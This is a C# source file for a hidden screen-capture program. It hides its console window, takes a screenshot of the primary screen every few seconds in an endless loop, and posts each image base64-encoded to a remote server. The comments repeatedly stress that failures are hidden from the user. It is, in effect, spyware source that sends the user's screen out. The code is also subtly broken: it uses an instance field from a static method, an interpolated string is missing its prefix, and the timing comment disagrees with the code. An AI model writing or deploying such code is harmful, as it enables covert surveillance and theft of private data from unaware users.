using System;
using System.Drawing;  // For Rectangle, Bitmap, Graphics, etc.
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms; // Add this for Screen class
using System.Drawing.Imaging;

namespace winS
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        string serverUrl  = "http://server";

        static void Main(string[] args)
        {
            // Hide the console window
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

           // Console.WriteLine("Background application running...");

            while (true)
            {
                try
                {
                    // Capture screenshot
                    string base64Screenshot = CaptureScreenshot();

                    // Post to server
                    PostToServer(base64Screenshot);
                }
                catch (Exception ex)
                {
                    // Log errors silently without showing any message to the user
                    LogError(ex);
                }

                // Wait for 10 minutes before taking another screenshot
                Thread.Sleep(TimeSpan.FromSeconds(10));
            }
        }

        static string CaptureScreenshot()
        {
            // Get the screen dimensions from Screen.PrimaryScreen.Bounds
            Rectangle screenBounds = Screen.PrimaryScreen.Bounds;

            using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] imageBytes = ms.ToArray();
                    return Convert.ToBase64String(imageBytes);
                }
            }
        }

        static void PostToServer(string base64Screenshot)
        {
            using (HttpClient client = new HttpClient())
            {
                // string serverUrl = "http://ip/sc/index.php";

                var content = new StringContent("{\"image\":\"" + base64Screenshot + "\"}", Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = client.PostAsync(serverUrl, content).Result; // Blocking call for compatibility with .NET 4.0

                    if (!response.IsSuccessStatusCode)
                    {
                        throw new Exception("Failed to upload screenshot: {response.StatusCode}");
                    }
                }
                catch (HttpRequestException)
                {
                    // Silently handle network errors (e.g., no internet)
                    // No notification to user, just return silently
                }
            }
        }

        static void LogError(Exception ex)
        {
            try
            {
                // Write error to a log file silently
                string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error_log.txt");
                File.AppendAllText(logFilePath, DateTime.Now.ToString() + ": " + ex.Message + " - " + ex.StackTrace + "\n");

            }
            catch
            {
                // If log writing fails, ignore the error (no user alerts)
            }
        }
    }
}
